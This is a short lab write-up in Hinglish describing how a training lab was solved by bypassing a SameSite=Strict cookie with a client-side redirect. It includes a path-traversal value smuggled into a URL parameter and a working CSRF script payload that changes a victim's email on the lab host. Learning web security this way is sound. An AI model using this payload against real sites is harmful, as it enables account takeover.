### ✅ **Steps I Followed to Solve the Lab (SameSite Strict Bypass via Client-Side Redirect)**

1. **Login kiya** `wiener:peter` credentials se.

2. **Burp Suite** mein dekha ke response mein cookie ka attribute:

   ```
   Set-Cookie: session=xyz; SameSite=Strict
   ```

3. Socha ke CSRF mushkil hoga, lekin **comment post kiya blog post pe**.

4. Dekha ke **comment submit hone ke baad** mujhe `/post/comment/confirmation?postId=xyz` pe bheja gaya, phir **auto redirect** ho gaya back to blog post.

5. Socha: "Yeh redirect to client-side JavaScript se ho raha hai – exploit ka chance hai!"

6. URL manually test kiya:

   ```
   /post/comment/confirmation?postId=1/../../my-account
   ```

   → Redirect success — session cookie bhi gayi!

7. **Exploit Server** pe gaya, aur yeh payload daala:

   ```html
   <script>
   document.location = "https://0a3f003f040aed1a80317699004b003f.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
   </script>
   ```

8. **Payload test kiya khud pe** — email change ho gaya ✅

9. **Email ko attacker value pe set kiya (jo meri na ho)**

10. **"Deliver exploit to victim"** button dabaya

11. **Lab solved** — victim ka email change ho gaya.

---

